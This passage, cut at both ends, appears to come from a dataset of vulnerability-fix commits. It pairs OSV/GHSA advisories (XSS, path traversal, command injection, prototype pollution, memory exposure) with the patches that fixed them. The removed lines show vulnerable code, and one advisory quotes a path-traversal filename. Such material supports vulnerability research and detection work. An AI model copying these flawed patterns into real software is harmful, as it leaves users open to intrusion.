be treated as scalar text only.\n\nResolves: #96743\nReleases: main, 11.5, 10.4\nChange-Id: I5e8dab26119490ecf19ac5d48c2bc7a5a00daaad\nSecurity-Bulletin: TYPO3-CORE-SA-2022-003\nSecurity-References: CVE-2022-31048\nReviewed-on: https:\/\/review.typo3.org\/c\/Packages\/TYPO3.CMS\/+\/73297\nTested-by: Oliver Hader <oliver.hader@typo3.org>\nReviewed-by: Oliver Hader <oliver.hader@typo3.org>","author":"Gabe Troyan","comments":null,"stats":"{'additions': 6, 'deletions': 6, 'total': 12}","files":"{'typo3\/sysext\/form\/Resources\/Public\/JavaScript\/backend\/form-editor\/stage-component.js': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TYPO3\/typo3\/raw\/6f2554dc4ea0b670fd5599c54fd788d4db96c4a0\/typo3%2Fsysext%2Fform%2FResources%2FPublic%2FJavaScript%2Fbackend%2Fform-editor%2Fstage-component.js', 'patch': \"@@ -513,10 +513,10 @@ function factory($, Helper, Icons) {\\n      *\/\\n     function setStageHeadline(title) {\\n       if (getUtility().isUndefinedOrNull(title)) {\\n-        title = buildTitleByFormElement();\\n+        title = buildTitleByFormElement().text();\\n       }\\n \\n-      $(getHelper().getDomElementDataIdentifierSelector('stageHeadline')).html(title);\\n+      $(getHelper().getDomElementDataIdentifierSelector('stageHeadline')).text(title);\\n     };\\n \\n     \/**\\n@@ -981,10 +981,10 @@ function factory($, Helper, Icons) {\\n \\n       getHelper()\\n         .getTemplatePropertyDomElement('_type', template)\\n-        .append(getFormElementDefinition(formElement, 'label'));\\n+        .append(document.createTextNode(getFormElementDefinition(formElement, 'label')));\\n       getHelper()\\n         .getTemplatePropertyDomElement('_identifier', template)\\n-        .append(formElement.get('identifier'));\\n+        .append(document.createTextNode(formElement.get('identifier')));\\n     };\\n \\n     \/**\\n@@ -1029,7 +1029,7 @@ function factory($, Helper, Icons) {\\n \\n             getHelper()\\n               .getTemplatePropertyDomElement('_label', rowTemplate)\\n-              .append(collectionElementConfiguration['label']);\\n+              .append(document.createTextNode(collectionElementConfiguration['label']));\\n             $(getHelper().getDomElementDataIdentifierSelector('validatorsContainer'), $(template))\\n               .append(rowTemplate.html());\\n           }\\n@@ -1089,7 +1089,7 @@ function factory($, Helper, Icons) {\\n           }\\n         }\\n \\n-        getHelper().getTemplatePropertyDomElement('_label', rowTemplate).append(label);\\n+        getHelper().getTemplatePropertyDomElement('_label', rowTemplate).append(document.createTextNode(label));\\n \\n         if (isPreselected) {\\n           getHelper().getTemplatePropertyDomElement('_label', rowTemplate).addClass(\"}}","message_norm":"[security] ensure text preview of multivalue items in form editor\n\nmultivalue items in the form editor user interface were previewed\nas html, but should be treated as scalar text only.\n\nresolves: #96743\nreleases: main, 11.5, 10.4\nchange-id: i5e8dab26119490ecf19ac5d48c2bc7a5a00daaad\nsecurity-bulletin: typo3-core-sa-2022-003\nsecurity-references: cve-2022-31048\nreviewed-on: https:\/\/review.typo3.org\/c\/packages\/typo3.cms\/+\/73297\ntested-by: oliver hader <oliver.hader@typo3.org>\nreviewed-by: oliver hader <oliver.hader@typo3.org>","language":"en","entities":"[('security', 'SECWORD', ''), ('ensure', 'ACTION', ''), ('#96743', 'ISSUE', ''), ('security', 'SECWORD', ''), ('security', 'SECWORD', ''), ('cve-2022-31048', 'VULNID', 'CVE'), ('https:\/\/review.typo3.org\/c\/packages\/typo3.cms\/+\/73297', 'URL', ''), ('oliver.hader@typo3.org', 'EMAIL', ''), ('oliver.hader@typo3.org', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['typo3\/sysext\/form\/Resources\/Public\/JavaScript\/backend\/form-editor\/stage-component.js'])","num_files":1.0},{"index":314,"vuln_id":"GHSA-3v6h-hqm4-2rg6","cwe_id":"{'CWE-22'}","score":0.0,"chain":"{'https:\/\/github.com\/cthackers\/adm-zip\/commit\/62f64004fefb894c523a7143e8a88ebe6c84df25'}","dataset":"osv","summary":"Arbitrary File Write in adm-zip Versions of `adm-zip` before 0.4.9 are vulnerable to arbitrary file write when used to extract a specifically crafted archive that contains path traversal filenames (`..\/..\/file.txt` for example).\n\n\n## Recommendation\n\nUpdate to version 0.4.9 or later.","published_date":"2018-07-27","chain_len":1,"project":"https:\/\/github.com\/cthackers\/adm-zip","commit_href":"https:\/\/github.com\/cthackers\/adm-zip\/commit\/62f64004fefb894c523a7143e8a88ebe6c84df25","commit_sha":"62f64004fefb894c523a7143e8a88ebe6c84df25","patch":"SINGLE","chain_ord":"['62f64004fefb894c523a7143e8a88ebe6c84df25']","before_first_fix_commit":"{'e116bc18df51e4e50c493cede82ae7696954b511', '6f4dfeb9a2166e93207443879988f97d88a37cde'}","last_fix_commit":"62f64004fefb894c523a7143e8a88ebe6c84df25","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2018, 07:20:56","message":"Merge pull request #212 from aviadatsnyk\/master\n\nfix: prevent extracting archived files outside of target path.  Credit to Snyk Security Research Team for disclosure and fixing the issue.","author":"The Brain","comments":"{'com_1': {'author': 'Shubham-9798', 'datetime': '08\/27\/2018, 04:25:44', 'body': 'adding adm-zip'}}","stats":"{'additions': 11, 'deletions': 0, 'total': 11}","files":"{'adm-zip.js': {'additions': 11, 'deletions': 0, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/cthackers\/adm-zip\/raw\/62f64004fefb894c523a7143e8a88ebe6c84df25\/adm-zip.js', 'patch': '@@ -354,6 +354,9 @@ module.exports = function(\/*String*\/input) {\\n \\n \\n             var target = pth.resolve(targetPath, maintainEntryPath ? entryName : pth.basename(entryName));\\n+            if(!target.startsWith(targetPath)) {\\n+                throw Utils.Errors.INVALID_FILENAME + \": \" + entryName;\\n+            }\\n \\n             if (item.isDirectory) {\\n                 target = pth.resolve(target, \"..\");\\n@@ -429,6 +432,10 @@ module.exports = function(\/*String*\/input) {\\n             _zip.entries.forEach(function(entry) {\\n                 entryName = entry.entryName.toString();\\n \\n+                if(!pth.resolve(targetPath, entryName).startsWith(targetPath)) {\\n+                    throw Utils.Errors.INVALID_FILENAME + \": \" + entryName;\\n+                }\\n+\\n                 if(isWin){\\n                     entryName = escapeFileName(entryName)\\n                 }\\n@@ -471,6 +478,10 @@ module.exports = function(\/*String*\/input) {\\n                     entryName = escapeFileName(entryName)\\n                 }\\n \\n+                if(!pth.resolve(targetPath, entryName).startsWith(targetPath)) {\\n+                  throw Utils.Errors.INVALID_FILENAME + \": \" + entryName;\\n+                }\\n+\\n                 if (entry.isDirectory) {\\n                     Utils.makeDir(pth.resolve(targetPath, entryName));\\n                     if(--i == 0)'}}","message_norm":"merge pull request #212 from aviadatsnyk\/master\n\nfix: prevent extracting archived files outside of target path.  credit to snyk security research team for disclosure and fixing the issue.","language":"en","entities":"[('#212', 'ISSUE', ''), ('prevent', 'ACTION', ''), ('security', 'SECWORD', ''), ('disclosure', 'SECWORD', ''), ('fixing', 'ACTION', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['adm-zip.js'])","num_files":1.0},{"index":316,"vuln_id":"GHSA-3w67-q784-6w7c","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `GatherNd` ### Impact\nThe reference implementation of the `GatherNd` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7\/tensorflow\/lite\/kernels\/internal\/reference\/reference_ops.h#L966):\n\n```cc \nret.dims_to_count[i] = remain_flat_size \/ params_shape.Dims(i);\n```\n\nAn attacker can craft a model such that `params` input would be an empty tensor. In turn, `params_shape.Dims(.)` would be zero, in at least one dimension.\n\n### Patches\nWe have patched the issue in GitHub commit [8e45822aa0b9f5df4b4c64f221e64dc930a70a9d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d","commit_sha":"8e45822aa0b9f5df4b4c64f221e64dc930a70a9d","patch":"SINGLE","chain_ord":"['8e45822aa0b9f5df4b4c64f221e64dc930a70a9d']","before_first_fix_commit":"{'0d45ea1ca641b21b73bcf9c00e0179cda284e7e7'}","last_fix_commit":"8e45822aa0b9f5df4b4c64f221e64dc930a70a9d","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 00:46:10","message":"Handle one more division by 0 in TFLite.\n\nPiperOrigin-RevId: 370800140\nChange-Id: I9ab42e5aaccf02f226d1282611490a54cf7d273e","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/lite\/kernels\/gather_nd.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d\/tensorflow%2Flite%2Fkernels%2Fgather_nd.cc', 'patch': '@@ -155,6 +155,9 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   TF_LITE_ENSURE_OK(context,\\n                     GetOutputSafe(context, node, kOutputTensor, &output));\\n \\n+  \/\/ Prevent division by 0 in the helper\\n+  TF_LITE_ENSURE(context, NumElements(params) > 0);\\n+\\n   switch (indices->type) {\\n     case kTfLiteInt32:\\n       return EvalGatherNd<int32_t>(context, params, indices, output);'}}","message_norm":"handle one more division by 0 in tflite.\n\npiperorigin-revid: 370800140\nchange-id: i9ab42e5aaccf02f226d1282611490a54cf7d273e","language":"en","entities":"[('division by 0', 'SECWORD', ''), ('370800140', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/gather_nd.cc'])","num_files":1.0},{"index":318,"vuln_id":"GHSA-3wcq-x3mq-6r9p","cwe_id":"{'CWE-908', 'CWE-200'}","score":7.7,"chain":"{'https:\/\/github.com\/mafintosh\/dns-packet\/commit\/0d0d593f8df4e2712c43957a6c62e95047f12b2d', 'https:\/\/github.com\/mafintosh\/dns-packet\/commit\/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56'}","dataset":"osv","summary":"Potential memory exposure in dns-packet This affects the package dns-packet before versions 1.3.2 and 5.2.2. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.","published_date":"2021-05-24","chain_len":2,"project":"https:\/\/github.com\/mafintosh\/dns-packet","commit_href":"https:\/\/github.com\/mafintosh\/dns-packet\/commit\/0d0d593f8df4e2712c43957a6c62e95047f12b2d","commit_sha":"0d0d593f8df4e2712c43957a6c62e95047f12b2d","patch":"MULTI","chain_ord":"['25f15dd0fedc53688b25fd053ebbdffe3d5c1c56', '0d0d593f8df4e2712c43957a6c62e95047f12b2d']","before_first_fix_commit":"{'7f35bac5b4680d7bfbb34fbc475ecfdbf9d25092'}","last_fix_commit":"0d0d593f8df4e2712c43957a6c62e95047f12b2d","chain_ord_pos":2.0,"commit_datetime":"05\/25\/2021, 08:35:02","message":"backport encodingLength fix to v1","author":"Mathias Buus","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'index.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mafintosh\/dns-packet\/raw\/0d0d593f8df4e2712c43957a6c62e95047f12b2d\/index.js', 'patch': \"@@ -74,7 +74,8 @@ name.decode = function (buf, offset) {\\n name.decode.bytes = 0\\n \\n name.encodingLength = function (n) {\\n-  return Buffer.byteLength(n) + 2\\n+  if (n === '.') return 1\\n+  return Buffer.byteLength(n.replace(\/^\\\\.|\\\\.$\/gm, '')) + 2\\n }\\n \\n var string = {}\"}}","message_norm":"backport encodinglength fix to v1","language":"en","entities":"[('encodinglength', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":319,"vuln_id":"GHSA-3wcq-x3mq-6r9p","cwe_id":"{'CWE-908', 'CWE-200'}","score":7.7,"chain":"{'https:\/\/github.com\/mafintosh\/dns-packet\/commit\/0d0d593f8df4e2712c43957a6c62e95047f12b2d', 'https:\/\/github.com\/mafintosh\/dns-packet\/commit\/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56'}","dataset":"osv","summary":"Potential memory exposure in dns-packet This affects the package dns-packet before versions 1.3.2 and 5.2.2. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.","published_date":"2021-05-24","chain_len":2,"project":"https:\/\/github.com\/mafintosh\/dns-packet","commit_href":"https:\/\/github.com\/mafintosh\/dns-packet\/commit\/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56","commit_sha":"25f15dd0fedc53688b25fd053ebbdffe3d5c1c56","patch":"MULTI","chain_ord":"['25f15dd0fedc53688b25fd053ebbdffe3d5c1c56', '0d0d593f8df4e2712c43957a6c62e95047f12b2d']","before_first_fix_commit":"{'7f35bac5b4680d7bfbb34fbc475ecfdbf9d25092'}","last_fix_commit":"0d0d593f8df4e2712c43957a6c62e95047f12b2d","chain_ord_pos":1.0,"commit_datetime":"05\/19\/2021, 17:59:39","message":"do trim on encodingLength as well","author":"Mathias Buus","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mafintosh\/dns-packet\/raw\/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56\/index.js', 'patch': \"@@ -78,7 +78,7 @@ name.decode.bytes = 0\\n \\n name.encodingLength = function (n) {\\n   if (n === '.') return 1\\n-  return Buffer.byteLength(n) + 2\\n+  return Buffer.byteLength(n.replace(\/^\\\\.|\\\\.$\/gm, '')) + 2\\n }\\n \\n const string = {}\"}}","message_norm":"do trim on encodinglength as well","language":"en","entities":"[('encodinglength', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":320,"vuln_id":"GHSA-3wfj-vh84-732p","cwe_id":"{'CWE-78'}","score":7.5,"chain":"{'https:\/\/github.com\/apache\/activemq\/commit\/00921f22ff9a8792d7663ef8fadd4823402a6324'}","dataset":"osv","summary":"Improper Neutralization of Special Elements used in an OS Command in Apache ActiveMQ The processControlCommand function in broker\/TransportConnection.java in Apache ActiveMQ before 5.11.0 allows remote attackers to cause a denial of service (shutdown) via a shutdown command.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/apache\/activemq","commit_href":"https:\/\/github.com\/apache\/activemq\/commit\/00921f22ff9a8792d7663ef8fadd4823402a6324","commit_sha":"00921f22ff9a8792d7663ef8fadd4823402a6324","patch":"SINGLE","chain_ord":"['00921f22ff9a8792d7663ef8fadd4823402a6324']","before_first_fix_commit":"{'9a6d444e0a492231ad1f4833448b3bbacd839bce'}","last_fix_commit":"00921f22ff9a8792d7663ef8fadd4823402a6324","chain_ord_pos":1.0,"commit_datetime":"08\/13\/2014, 15:15:29","message":"Remove unused ConnectionControl handling.","author":"Timothy Bish","comments":"{'com_1': {'author': 'tritschler', 'datetime': '11\/10\/2015, 09:33:23', 'body': 'No more shutdown ?'}, 'com_2': {'author': 'Hvnt3r', 'datetime': '07\/18\/2019, 08:46:59', 'body': '> No more shutdown ?\\r\\n\\r\\nyes'}}","stats":"{'additions': 0, 'deletions': 4, 'total': 4}","files":"{'activemq-broker\/src\/main\/java\/org\/apache\/activemq\/broker\/TransportConnection.java': {'additions': 0, 'deletions': 4, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/activemq\/raw\/00921f22ff9a8792d7663ef8fadd4823402a6324\/activemq-broker%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Factivemq%2Fbroker%2FTransportConnection.java', 'patch': '@@ -1534,10 +1534,6 @@ public int getProtocolVersion() {\\n \\n     @Override\\n     public Response processControlCommand(ControlCommand command) throws Exception {\\n-        String control = command.getCommand();\\n-        if (control != null && control.equals(\"shutdown\")) {\\n-            System.exit(0);\\n-        }\\n         return null;\\n     }'}}","message_norm":"remove unused connectioncontrol handling.","language":"en","entities":"[('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['activemq-broker\/src\/main\/java\/org\/apache\/activemq\/broker\/TransportConnection.java'])","num_files":1.0},{"index":322,"vuln_id":"GHSA-3wwj-wh2w-g4xp","cwe_id":"{'CWE-93'}","score":7.6,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128'}","dataset":"osv","summary":"CRLF Injection in microweber CRLF Injection leads to Stack Trace Exposure due to lack of filtering at https:\/\/demo.microweber.org\/ in Packagist microweber\/microweber prior to 1.2.11.","published_date":"2022-02-19","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128","commit_sha":"f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128","patch":"SINGLE","chain_ord":"['f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128']","before_first_fix_commit":"{'7bdd97ec1ff4740ac8fa898b74ef9bce56bcf193'}","last_fix_commit":"f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128","chain_ord_pos":1.0,"commit_datetime":"02\/17\/2022, 14:49:46","message":"Update UrlManager.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 2, 'deletions': 3, 'total': 5}","files":"{'src\/MicroweberPackages\/Helper\/UrlManager.php': {'additions': 2, 'deletions': 3, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128\/src%2FMicroweberPackages%2FHelper%2FUrlManager.php', 'patch': '@@ -111,9 +111,8 @@ public function redirect($url)\\n             }\\n         }\\n \\n-        if (!filter_var($redirectUrl, FILTER_VALIDATE_URL)) {\\n-            $redirectUrl = site_url();\\n-        }\\n+        $redirectUrl = str_replace(\"\\\\r\", \"\", $redirectUrl);\\n+        $redirectUrl = str_replace(\"\\\\n\", \"\", $redirectUrl);\\n \\n         if (headers_sent()) {\\n             echo \\'<meta http-equiv=\"refresh\" content=\"0;url=\\' . $redirectUrl . \\'\">\\';'}}","message_norm":"update urlmanager.php","language":"sv","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SUBMIT_CENTERED","list_files":"dict_keys(['src\/MicroweberPackages\/Helper\/UrlManager.php'])","num_files":1.0},{"index":325,"vuln_id":"GHSA-3x62-x456-q2vm","cwe_id":"{'CWE-77', 'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/feross\/git-pull-or-clone\/commit\/f9ce092be13cc32e685dfa26e7705e9c6e3108a3'}","dataset":"osv","summary":"OS Command Injection in git-pull-or-clone The package git-pull-or-clone before 2.0.2 is vulnerable to Command Injection due to the use of the --upload-pack feature of git which is also supported for git clone. The source includes the use of the secure child process API spawn(). However, the outpath parameter passed to it may be a command-line argument to the git clone command and result in arbitrary command injection.","published_date":"2022-05-03","chain_len":1,"project":"https:\/\/github.com\/feross\/git-pull-or-clone","commit_href":"https:\/\/github.com\/feross\/git-pull-or-clone\/commit\/f9ce092be13cc32e685dfa26e7705e9c6e3108a3","commit_sha":"f9ce092be13cc32e685dfa26e7705e9c6e3108a3","patch":"SINGLE","chain_ord":"['f9ce092be13cc32e685dfa26e7705e9c6e3108a3']","before_first_fix_commit":"{'4f8b9baf295e6d2e5dd987abca820987afb7643c'}","last_fix_commit":"f9ce092be13cc32e685dfa26e7705e9c6e3108a3","chain_ord_pos":1.0,"commit_datetime":"04\/06\/2022, 10:13:53","message":"fix: fix command injection vector","author":"Liran Tal","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/feross\/git-pull-or-clone\/raw\/f9ce092be13cc32e685dfa26e7705e9c6e3108a3\/index.js', 'patch': \"@@ -28,7 +28,7 @@ function gitPullOrClone (url, outPath, opts, cb) {\\n   function gitClone () {\\n     \/\/ --depth implies --single-branch\\n     const flag = depth < Infinity ? '--depth=' + depth : '--single-branch'\\n-    const args = ['clone', flag, url, outPath]\\n+    const args = ['clone', flag, '--', url, outPath]\\n     debug('git ' + args.join(' '))\\n     spawn('git', args, {}, function (err) {\\n       if (err) err.message += ' (git clone) (' + url + ')'\"}}","message_norm":"fix: fix command injection vector","language":"en","entities":"[('fix', 'ACTION', ''), ('command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":326,"vuln_id":"GHSA-3x96-m42v-hvh5","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/c51285f791e48e536111cd57a9544ccbf7f33961'}","dataset":"osv","summary":"Cross-site Scripting in Microweber Cross-site Scripting (XSS) - Reflected in GitHub repository microweber\/microweber prior to 1.2.18.","published_date":"2022-06-23","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/c51285f791e48e536111cd57a9544ccbf7f33961","commit_sha":"c51285f791e48e536111cd57a9544ccbf7f33961","patch":"SINGLE","chain_ord":"['c51285f791e48e536111cd57a9544ccbf7f33961']","before_first_fix_commit":"{'10550ec85018bb0f581edd0ac2aed0d7bc9fe6b1'}","last_fix_commit":"c51285f791e48e536111cd57a9544ccbf7f33961","chain_ord_pos":1.0,"commit_datetime":"06\/22\/2022, 11:56:16","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 9, 'deletions': 3, 'total': 12}","files":"{'userfiles\/modules\/microweber\/toolbar\/editor_tools\/module_settings\/index.php': {'additions': 9, 'deletions': 3, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/c51285f791e48e536111cd57a9544ccbf7f33961\/userfiles%2Fmodules%2Fmicroweber%2Ftoolbar%2Feditor_tools%2Fmodule_settings%2Findex.php', 'patch': '@@ -87,11 +87,13 @@\\n     if (isset($_GET[\\'autosize\\'])) {\\n         $autoSize = $_GET[\\'autosize\\'];\\n     }\\n+    $autoSize = xss_clean($autoSize);\\n \\n     $type = \\'\\';\\n     if (isset($_GET[\\'type\\'])) {\\n         $type = $_GET[\\'type\\'];\\n     }\\n+    $type = xss_clean($type);\\n \\n     $mod_id = $mod_orig_id = false;\\n     $is_linked_mod = false;\\n@@ -403,7 +405,9 @@\\n                 if (mw.notification) {\\n                     mw.notification.success(\\'<?php _ejs(\\'Settings are saved\\') ?>\\');\\n                 }\\n+                <?php if (isset($params[\\'id\\'])) : ?>\\n                 mw.reload_module_parent(\\'#<?php print $params[\\'id\\']  ?>\\')\\n+                <?php endif; ?>\\n \\n             });\\n \\n@@ -440,9 +444,11 @@\\n <body class=\"mw-external-loading loading\">\\n <div id=\"settings-main\">\\n     <div id=\"settings-container\">\\n-        <div class=\"mw-module-live-edit-settings <?php print $params[\\'id\\'] ?>\"\\n-             id=\"module-id-<?php print $params[\\'id\\'] ?>\">{content}\\n-        <\/div>\\n+        <?php if (isset($params[\\'id\\'])) : ?>\\n+            <div class=\"mw-module-live-edit-settings <?php print $params[\\'id\\'] ?>\"\\n+                 id=\"module-id-<?php print $params[\\'id\\'] ?>\">{content}\\n+            <\/div>\\n+        <?php endif; ?>\\n     <\/div>\\n <\/div>'}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['userfiles\/modules\/microweber\/toolbar\/editor_tools\/module_settings\/index.php'])","num_files":1.0},{"index":327,"vuln_id":"GHSA-3xc7-xg67-pw99","cwe_id":"{'CWE-532'}","score":3.5,"chain":"{'https:\/\/github.com\/FelixLC\/cli\/commit\/da59652c061a798282e18efad0b6d0afefa15465'}","dataset":"osv","summary":"Sensitive Data Exposure in sequelize-cli Versions of `sequelize-cli` prior to 5.5.0 are vulnerable to Sensitive Data Exposure. The function `filteredURL()` does not properly sanitize the `config.password` value which may cause passwords with special characters to be logged in plain text.\n\n\n## Recommendation\n\nUpgrade to version 5.5.0 or later.","published_date":"2019-06-05","chain_len":1,"project":"https:\/\/github.com\/FelixLC\/cli","commit_href":"https:\/\/github.com\/FelixLC\/cli\/commit\/da59652c061a798282e18efad0b6d0afefa15465","commit_sha":"da59652c061a798282e18efad0b6d0afefa15465","patch":"SINGLE","chain_ord":"['da59652c061a798282e18efad0b6d0afefa15465']","before_first_fix_commit":"{'139f854f05b76367a0bb5bfcc5a9cf549879f432'}","last_fix_commit":"da59652c061a798282e18efad0b6d0afefa15465","chain_ord_pos":1.0,"commit_datetime":"12\/04\/2018, 10:53:36","message":"Bug Fix: Special characters in password are not escaped\n\nhttps:\/\/github.com\/sequelize\/cli\/issues\/172 is stil open when special characters find their way in a password","author":"FelixLC","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/helpers\/config-helper.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FelixLC\/cli\/raw\/da59652c061a798282e18efad0b6d0afefa15465\/src%2Fhelpers%2Fconfig-helper.js', 'patch': \"@@ -152,7 +152,7 @@ const api = {\\n   },\\n \\n   filteredUrl (uri, config) {\\n-    const regExp = new RegExp(':?' + (config.password || '') + '@');\\n+    const regExp = new RegExp(':?' + _.escapeRegExp(config.password) + '@');\\n     return uri.replace(regExp, ':*****@');\\n   },\"}}","message_norm":"bug fix: special characters in password are not escaped\n\nhttps:\/\/github.com\/sequelize\/cli\/issues\/172 is stil open when special characters find their way in a password","language":"en","entities":"[('bug', 'FLAW', ''), ('password', 'SECWORD', ''), ('escaped', 'SECWORD', ''), ('https:\/\/github.com\/sequelize\/cli\/issues\/172', 'URL', ''), ('password', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/helpers\/config-helper.js'])","num_files":1.0},{"index":328,"vuln_id":"GHSA-3xgx-r9j4-qw9w","cwe_id":"{'CWE-1321'}","score":7.3,"chain":"{'https:\/\/github.com\/dexie\/Dexie.js\/commit\/1d655a69b9f28c3af6fae10cf5c61df387dc689b'}","dataset":"osv","summary":"Prototype Pollution in Dexie Dexie is a minimalistic wrapper for IndexedDB. The package dexie before 3.2.2, from 4.0.0-alpha.1 and before 4.0.0-alpha.3 are vulnerable to Prototype Pollution in the Dexie.setByKeyPath(obj, keyPath, value) function which does not properly check the keys being set (like __proto__ or constructor). This can allow an attacker to add\/modify properties of the Object.prototype leading to prototype pollution vulnerability. **Note:** This vulnerability can occur in multiple ways, for example when modifying a collection with untrusted user input.","published_date":"2022-05-03","chain_len":1,"project":"https:\/\/github.com\/dexie\/Dexie.js","commit_href":"https:\/\/github.com\/dexie\/Dexie.js\/commit\/1d655a69b9f28c3af6fae10cf5c61df387dc689b","commit_sha":"1d655a69b9f28c3af6fae10cf5c61df387dc689b","patch":"SINGLE","chain_ord":"['1d655a69b9f28c3af6fae10cf5c61df387dc689b']","before_first_fix_commit":"{'b350b8cbc8a926b46c20f3a569555c4660a99ca4'}","last_fix_commit":"1d655a69b9f28c3af6fae10cf5c61df387dc689b","chain_ord_pos":1.0,"commit_datetime":"04\/27\/2022, 10:26:44","message":"Prohibit prototype pollution","author":"dfahlander","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/functions\/utils.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dexie\/Dexie.js\/raw\/1d655a69b9f28c3af6fae10cf5c61df387dc689b\/src%2Ffunctions%2Futils.ts', 'patch': '@@ -151,7 +151,7 @@ export function setByKeyPath(obj, keyPath, value) {\\n                 } else obj[currentKeyPath] = value;\\n             else {\\n                 var innerObj = obj[currentKeyPath];\\n-                if (!innerObj) innerObj = (obj[currentKeyPath] = {});\\n+                if (!innerObj || !hasOwn(obj, currentKeyPath)) innerObj = (obj[currentKeyPath] = {});\\n                 setByKeyPath(innerObj, remainingKeyPath, value);\\n             }\\n         } else {'}}","message_norm":"prohibit prototype pollution","language":"en","entities":"[('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/functions\/utils.ts'])","num_files":1.0},{"index":332,"vuln_id":"GHSA-4278-2v5v-65r4","cwe_id":"{'CWE-787', 'CWE-120'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eebb96c2830d48597d055d247c0e9aebaea94cd5'}","dataset":"osv","summary":"Heap buffer overflow in 